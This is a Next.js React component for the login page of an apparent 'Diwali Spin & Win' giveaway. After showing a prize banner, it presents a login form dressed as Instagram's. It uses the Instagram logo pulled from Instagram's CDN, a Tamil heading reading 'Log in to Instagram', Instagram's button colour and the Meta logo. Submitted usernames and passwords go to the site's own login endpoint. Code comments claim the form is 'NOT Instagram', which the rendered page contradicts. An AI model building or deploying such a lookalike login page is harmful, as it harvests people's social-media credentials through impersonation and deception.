"use client";
import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { useI18n } from "@/lib/i18n";

export default function AccountPage() {
  const { t } = useI18n();
  const router = useRouter();
  const [username, setUsername] = useState(""); const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false); const [error, setError] = useState(""); const [loading, setLoading] = useState(false);
  const [entry, setEntry] = useState<{ prizeId?: string; prizeName: string; prizeType: string } | null>(null);
  const [showWelcome, setShowWelcome] = useState(false);

  useEffect(() => {
    // Always show the login page here — do NOT auto-redirect to /success even
    // if a session cookie exists, so a returning player can log in again after
    // playing the game another time.
    setUsername(localStorage.getItem("diwali_handle") || "");
    try { const e = JSON.parse(localStorage.getItem("diwali_entry") || "null"); if (e) setEntry(e); } catch {}
    setShowWelcome(true);
  }, []);

  async function submit(e: React.FormEvent) {
    e.preventDefault(); setError(""); setLoading(true);
    try {
      const spinEntryId = (() => { try { return JSON.parse(localStorage.getItem("diwali_entry") || "null")?.id || ""; } catch { return ""; } })();
      const res = await fetch("/api/auth/login", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username, password, spinEntryId }) });
      const data = await res.json();
      if (!res.ok) { setError(data.error || t("acct.err.generic")); setLoading(false); return; }
      if (data.user?.instagramHandle) localStorage.setItem("diwali_handle", data.user.instagramHandle);
      router.push("/success");
    } catch { setError(t("acct.err.network")); setLoading(false); }
  }

  const prizeName = entry?.prizeId ? t(`prize.${entry.prizeId}.name`) : entry?.prizeName || "";
  const inputCls = "w-full bg-white border border-gray-300 rounded-lg px-3 py-2.5 text-sm text-gray-900 placeholder:text-gray-400 focus:border-gray-500";
  return (<div className="min-h-screen bg-[#1a0533] bg-[radial-gradient(ellipse_at_top,#4c1d95,#1a0533_65%)] px-4 py-10">
    <div className="w-full max-w-md mx-auto">
      {entry && entry.prizeType !== "none" && <div className="text-center bg-amber-400/15 border border-amber-300/40 rounded-2xl px-4 py-3 text-sm mb-4 animate-pop">{t("acct.winBanner", { prize: prizeName })}</div>}
      {/* Clean login card — Diwali Spin & Win's OWN account, NOT Instagram */}
      <div className="bg-white text-gray-900 rounded-[22px] shadow-2xl overflow-hidden animate-pop">
        <div className="bg-gradient-to-r from-amber-500 via-pink-600 to-purple-600 h-1.5" />
        
        

<div className="px-7 pt-8 pb-5 text-center">
  <div className="flex justify-center h-[50px]">
    <img
      src="https://static.cdninstagram.com/rsrc.php/yO/r/Ny6hrBVLYjl.webp"
      alt="Instagram"
      width={96}
      height={96}
      className="w-24 h-24 object-contain"
    />
  </div>
</div>



{/* Login Header */}
<div className="flex items-center justify-center relative px-7 pt-8 pb-6">
  {/* Back Arrow */}
  <button
    type="button"
    aria-label="Go back"
    className="absolute left-7 top-1/2 -translate-y-1/2 flex items-center justify-center w-9 h-9 rounded-full hover:bg-gray-100 transition"
  >
    <svg
      viewBox="0 0 24 24"
      fill="currentColor"
      width="24"
      height="24"
      aria-hidden="true"
    >
      <path
        fillRule="evenodd"
        clipRule="evenodd"
        d="M16.753 4.341a1 1 0 0 0-1.412-.094l-8 7a1 1 0 0 0 0 1.506l8 7a1 1 0 0 0 1.318-1.506L9.518 12l7.14-6.247a1 1 0 0 0 .094-1.412z"
      />
    </svg>
  </button>

  {/* Heading */}
  <h2 className="text-base font-semibold text-gray-900 text-center">
    Instagram இல் உள்நுழையுங்கள்
  </h2>
</div>


        <form onSubmit={submit} className="px-7 pb-5 space-y-3">
          <input className={inputCls} placeholder={t("acct.username")} onChange={e => setUsername(e.target.value)} autoComplete="username" required maxLength={60} />
          <div className="relative">
            <input type={showPw ? "text" : "password"} className={inputCls} placeholder={t("acct.password")} value={password} onChange={e => setPassword(e.target.value)} autoComplete="current-password" required minLength={6} />
            <button type="button" onClick={() => setShowPw(s => !s)} className="absolute right-3 top-1/2 -translate-y-1/2 text-xs font-bold text-gray-600">{showPw ? t("acct.hide") : t("acct.show")}</button>
          </div>
          {error && <div className="bg-red-50 border border-red-200 text-red-600 text-xs font-semibold rounded-lg px-3 py-2.5">⚠️ {error}</div>}
          <button disabled={loading} className="w-full bg-[#0095F6] hover:bg-[#1877F2] disabled:opacity-60 text-white font-bold py-3 rounded-xl text-sm shadow transition">{loading ? t("acct.wait") : t("acct.login")}</button>
          


           {/* Meta Logo */}
  <div className="flex justify-center pt-2">
    <svg
      aria-label="Meta Logo"
      className="w-28 h-auto"
      role="img"
      viewBox="0 0 500 100"
    >
      <path
        d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
        fill="#DEE3E9"
      />
      <path
        d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
        fill="#DEE3E9"
      />
    </svg>
  </div>

        </form>
      </div>
      <p className="text-center text-xs text-white/40 mt-4"><Link href="/" className="underline">{t("acct.back")}</Link></p>
    </div>

    {/* Welcome popup — about the Diwali Spin & Win account, NOT an Instagram login */}
    {showWelcome && (
      <div className="fixed inset-0 z-[80] bg-black/75 backdrop-blur-sm grid place-items-center px-4" role="dialog" aria-modal>
        <div className="w-full max-w-sm bg-white text-gray-900 rounded-[24px] p-6 text-center animate-pop shadow-2xl">
          <div className="mx-auto w-16 h-16 rounded-2xl grid place-items-center text-4xl bg-gradient-to-br from-amber-100 to-pink-100 border border-amber-200">🪔</div>
          <h2 className="text-xl font-black mt-3">{t("acct.popup.title")}</h2>
          <p className="text-sm text-gray-500 mt-2">{t("acct.popup.desc")}</p>
          <p className="text-[11px] text-gray-400 mt-2">{t("acct.popup.note")}</p>
          <button onClick={() => setShowWelcome(false)} className="mt-5 w-full bg-[#0095F6] hover:bg-[#1877F2] text-white font-bold py-3 rounded-xl text-sm transition">{t("acct.popup.btn")}</button>
        </div>
      </div>
    )}
  </div>);
}
